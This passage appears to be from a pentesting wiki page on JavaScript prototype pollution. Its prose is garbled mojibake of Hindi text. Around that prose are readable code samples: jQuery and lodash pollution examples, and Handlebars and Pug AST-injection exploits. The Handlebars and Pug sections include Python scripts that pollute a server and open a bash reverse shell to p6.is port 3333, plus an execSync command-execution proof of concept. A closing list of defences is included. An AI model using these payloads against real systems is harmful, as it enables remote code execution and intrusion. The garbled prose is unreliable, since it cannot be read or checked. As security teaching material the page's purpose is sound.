рдпрд╣рд╛рдВ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣реИ рдЬреЛ `Object.prototype.isAdmin = true` рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдирд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рддрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рдХреЛрдИ рдорд╛рди рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реЛ, `user.isAdmin` рд╣рдореЗрд╢рд╛ рд╕рдЪ рд╣реЛрдЧрд╛!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `obj[a][b] = value`. рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд╛рд░ рд╡реНрдпрдХреНрддрд┐ рдХреЛ `a` рдФрд░ `value` рдХрд╛ рдорд╛рди рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЙрд╕реЗ рдХреЗрд╡рд▓ `a` рдХреЗ рдорд╛рди рдХреЛ `__proto__` рдкрд░ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, `obj["__proto__"]` рдФрд░ `obj.__proto__` рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдорд╛рди рд╣реЛрддреЗ рд╣реИрдВ) рддрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдореМрдЬреВрдж рд╕рднреА рд╡рд╕реНрддреБрдУрдВ рдХреА рд╕рдВрдкрддреНрддрд┐ `b` рдХреЛ `value` рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдпрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдКрдкрд░ рджрд┐рдП рдЧрдП рддрд░реАрдХреЗ рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛ рдЗрддрдирд╛ рд╕рд░рд▓ рдирд╣реАрдВ рд╣реИ, [рдкреЗрдкрд░](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) рдХреЗ рдЕрдиреБрд╕рд╛рд░, рд╣рдо рдХреЗрд╡рд▓ рддрдм рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреАрди рдореЗрдВ рд╕реЗ рдХреЛрдИ рдПрдХ рд╕реНрдерд┐рддрд┐ рдкреВрд░реА рд╣реЛ:

* рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдорд░реНрдЬрд╝ рдХрд░реЗрдВ
* рдкрде рджреНрд╡рд╛рд░рд╛ рд╕рдВрдкрддреНрддрд┐ рдкрд░рд┐рднрд╛рд╖рдг
* рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓реЛрди рдХрд░реЗрдВ

### рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЕрдзрд┐рд░реЛрд╣рд┐рдд рдХрд░реЗрдВ
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution рд╕реЗ RCE рддрдХ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╕реЗ XSS рддрдХ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019тАУ11358: jQuery $ .extend рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣рдорд▓рд╛

$ .extend, рдЕрдЧрд░ рдЧрд▓рдд рдврдВрдЧ рд╕реЗ рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдП, рддреЛ `prototype` рдСрдмреНрдЬреЗрдХреНрдЯ (рдРрдк рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЯреЗрдореНрдкрд▓реЗрдЯ) рдХреА рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдлрд┐рд░ рд╕рднреА рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреЗрд╡рд▓ "рдЧрд╣рд░реЗ" рд╕рдВрд╕реНрдХрд░рдг (рдЕрд░реНрдерд╛рддреН g) рдХрд╛ $ .extend рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░реЛрдЧреНрд░рд╛рдорд░ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдХреНрд╕рд░ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рдирдХрд▓ рдмрдирд╛рдиреЗ рдпрд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рдирдИ рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рднрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

рд╣рдо `myObject` рдХреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЗрдирдкреБрдЯ рдлрд╝реАрд▓реНрдб рдорд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ DB рдореЗрдВ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)

рдЗрд╕ рдХреЛрдб рдореЗрдВ, рд╣рдо рдЖрдорддреМрд░ рдкрд░ рд╕реЛрдЪрддреЗ рд╣реИрдВ, рдЬрдм рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ `isAdmin` рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХреЛ рдирдП рдмрдирд╛рдП рдЧрдП рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдЕрд╕рд╛рдЗрди рдХрд░реЗрдЧрд╛ред рд▓реЗрдХрд┐рди рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрд╣ рд╕реАрдзреЗ `{}` рдореЗрдВ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `{}.isAdmin` `true` рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕ рдХреЛрдб рдХреЗ рдмрд╛рдж, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪреЗрдХ рдХрд░рддреЗ рд╣реИрдВ:
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрднреА рддрдХ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ (`undefined`), рддреЛ рдЙрд╕рдХреЗ рдореВрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ `isAdmin` рд╕рдВрдкрддреНрддрд┐ рдЦреЛрдЬреА рдЬрд╛рдПрдЧреА, рдЬрд┐рд╕рдореЗрдВ `isAdmin` рдХреЗ рд╕рд╛рде `true` рдорд╛рди рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИред

рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдЬрдм JQuery 3.3.1 рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
рдпреЗ рддреНрд░реБрдЯрд┐рдпрд╛рдБ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдкрд░ рдЕрд╕рд░ рдбрд╛рд▓ рд╕рдХрддреА рд╣реИрдВ, рдЦрд╛рд╕рдХрд░ NodeJS рдкреНрд░реЛрдЬреЗрдХреНрдЯреНрд╕ рдкрд░, рд╕рдмрд╕реЗ рдкреНрд░рд╛рдпреЛрдЬрдирд┐рдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ Mongoose рдореЗрдВ рддреНрд░реБрдЯрд┐, рдЬреЛ рдбрд┐рд╕реЗрдВрдмрд░ 2018 рдореЗрдВ рд╣реБрдИред

### CVE-2018тАУ3721, CVE-2019тАУ10744: lodash рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рд╣рдорд▓рд╛

[Lodash](https://www.npmjs.com/package/lodash) рднреА рдПрдХ рдкреНрд░рд╕рд┐рджреНрдз рдкреБрд╕реНрддрдХрд╛рд▓рдп рд╣реИ рдЬреЛ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдлрд╝рдВрдХреНрд╢рди рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рд╣рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░рддреА рд╣реИ рдХреЛрдб рдХреЛ рдЕрдзрд┐рдХ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдФрд░ рд╕реБрд╢реЛрднрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд▓рд┐рдЦрдиреЗ рдореЗрдВ, рд╣рд░ рд╣рдлреНрддреЗ 19 рдорд┐рд▓рд┐рдпрди рд╕реЗ рдЕрдзрд┐рдХ рдбрд╛рдЙрдирд▓реЛрдб рдХреЗ рд╕рд╛рдеред рдФрд░ рдЗрд╕рдореЗрдВ JQuery рдХреА рддрд░рд╣реА рд╕рдорд╕реНрдпрд╛ рд╣реБрдИ рд╣реИред

**CVE-2018тАУ3721**

**CVE-2019тАУ10744**

рдпрд╣ рдмрдЧ Lodash рдХреЗ рд╕рднреА рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рдВрд╕реНрдХрд░рдг 4.17.11 рдореЗрдВ рдареАрдХ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

### рдПрдХ рдФрд░ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдЬрд┐рд╕рдореЗрдВ CVEs рд╣реИрдВ

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## AST рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг

NodeJS рдореЗрдВ, AST рдХреЛ рдмрд╣реБрдд рдмрд╛рд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдФрд░ рдЯрд╛рдЗрдкрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЖрджрд┐ред
рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреЗ рд▓рд┐рдП, рд╕рдВрд░рдЪрдирд╛ рдКрдкрд░ рджрд┐рдЦрд╛рдИ рдЧрдИ рддрд╕реНрд╡реАрд░ рдореЗрдВ рджрд┐рдЦрд╛рдИ рдЧрдИ рд╣реИред

![img](https://blog.p6.is/img/2020/08/graph\_3.jpg)

### Handlebars

рдЬрд╛рдирдХрд╛рд░реА [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/) рд╕реЗ рд▓реА рдЧрдИ рд╣реИ

рдЖрдк `Object.prototype.pendingContent` рдореЗрдВ рдХрд┐рд╕реА рднреА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдПрдХ рд╣рдорд▓реЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░ рд╕рдХреЗрдВред
рдпрд╣ рдЖрдкрдХреЛ рдпрдХреАрдиреА рдмрдирд╛рддрд╛ рд╣реИ рдХрд┐ рдЬрдм рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдПрдХ рдХрд╛рд▓реЗ-рдмреЙрдХреНрд╕ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░реНрд╕ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдЗрдВрдЬрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
рдпрд╣ `javascript-compiler.js` рдХреЗ `appendContent` рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
`appendContent` рдпрд╣ рд╣реИред рдпрджрд┐ `pendingContent` рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╕рд╛рдордЧреНрд░реА рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ рдФрд░ рд▓реМрдЯреЗрдВред

`pushSource` `pendingContent` рдХреЛ `undefined` рдмрдирд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХрд╛рдзрд┐рдХ рдмрд╛рд░ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдЕрдкрд╢рд┐рд╖реНрдЯ**

![img](https://blog.p6.is/img/2020/08/graph\_5.jpg)

рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдКрдкрд░ рджрд┐рдП рдЧрдП рдЧреНрд░рд╛рдл рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред

рд▓реЗрдХреНрд╕рд░ рдФрд░ рдкрд╛рд░реНрд╕рд░ рджреНрд╡рд╛рд░рд╛ AST рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдпрд╣ `compiler.js` рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
рд╣рдо рдХреБрдЫ рддрд╛рд░реНрдХрд┐рдХ рджреНрд╡рд╛рд░рд╛ рдЬрдирд░реЗрдЯ рдХрд┐рдП рдЧрдП рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рдпрд╣ "Hello posix" рдЬреИрд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рд▓реМрдЯрд╛рддрд╛ рд╣реИ (рдЬрдм msg posix рд╣реЛрддрд╛ рд╣реИ)ред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
рдкрд╛рд░реНрд╕рд░ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдореЗрдВ рдПрдХ рдиреЛрдб рдХреЗ рдорд╛рди рдХреЛ рд╣рдореЗрд╢рд╛ рдирдВрдмрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП Number рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╣рд╛рдВ рдПрдХ рдЧреИрд░-рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
рдкрд╣рд▓реЗ, compile рдлрд╝рдВрдХреНрд╢рди рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВ, рдФрд░ рдЗрд╕реЗ рджреЛ рддрд░реАрдХреЛрдВ рд╕реЗ рдЗрдирдкреБрдЯ рд╕рдкреЛрд░реНрдЯ рдХрд░рддрд╛ рд╣реИ, AST рдСрдмреНрдЬреЗрдХреНрдЯ рдФрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧред

рдЬрдм рдЗрдирдкреБрдЯ.type рдПрдХ `Program` рд╣реЛрддрд╛ рд╣реИ, рдлрд┐рд░ рднреА рдЗрдирдкреБрдЯ рдорд╛рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЛрддрд╛ рд╣реИред
рдкрд╛рд░реНрд╕рд░ рдЗрд╕реЗ рдкрд╛рд░реНрд╕рд░.js рджреНрд╡рд╛рд░рд╛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА AST рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдорд╛рдирддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓рд░ рдХреЛ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрд┐рдирд╛ рднреЗрдЬрддрд╛ рд╣реИред
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
рдХрдВрдкрд╛рдЗрд▓рд░ рджреНрд╡рд╛рд░рд╛ AST рдСрдмреНрдЬреЗрдХреНрдЯ (рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ) рдХреЛ `accept` рдореЗрдердб рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдФрд░ `accept` рдХрдВрдкрд╛рдЗрд▓рд░ рдХреЗ `this[node.type]` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред\
рдлрд┐рд░ AST рдХреЗ body рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХреЛ рд▓реЗрдХрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдПрдХ рд╣рдорд▓рд╛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдиреЗ рдкрд╛рд░реНрд╕рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдпрд╛ рд╣реИ, рддреЛ NumberLiteral рдХреЗ рдорд╛рди рдХреЛ рд╕реМрдВрдкрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЗрд╕рд▓рд┐рдП рдПрдХ рдРрд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВред рд▓реЗрдХрд┐рди Injected AST рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдХрд┐рд╕реА рднреА рдХреЛрдб рдХреЛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рдЙрджрд╛рд╣рд░рдг**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug) рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## рдореИрдВ рдХреНрдпрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рддрд╛рдХрд┐ рдпрд╣ рд░реЛрдХ рд╕рдХреВрдБ?

* Object.freeze (Object.prototype) рдХреЗ рд╕рд╛рде рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЛ рдлреНрд░реАрдЬ рдХрд░реЗрдВ
* рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд╕реНрдХреАрдорд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░ JSON рдЗрдирдкреБрдЯ рдкрд░ рдорд╛рдиреНрдпрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
* рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рд░рд┐рдХрд░реНрд╕рд┐рд╡ рдорд░реНрдЬрд╝ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ
* рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдЪреЗрди рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `Object.create(null)` рдЬреИрд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░реЙрдкрд░реНрдЯреА рд╡рд╛рд▓реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* `Object` рдХреА рдмрдЬрд╛рдп `Map` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдирдП рдкреИрдЪ рдХреЛ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ

## рд╕рдВрджрд░реНрдн

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

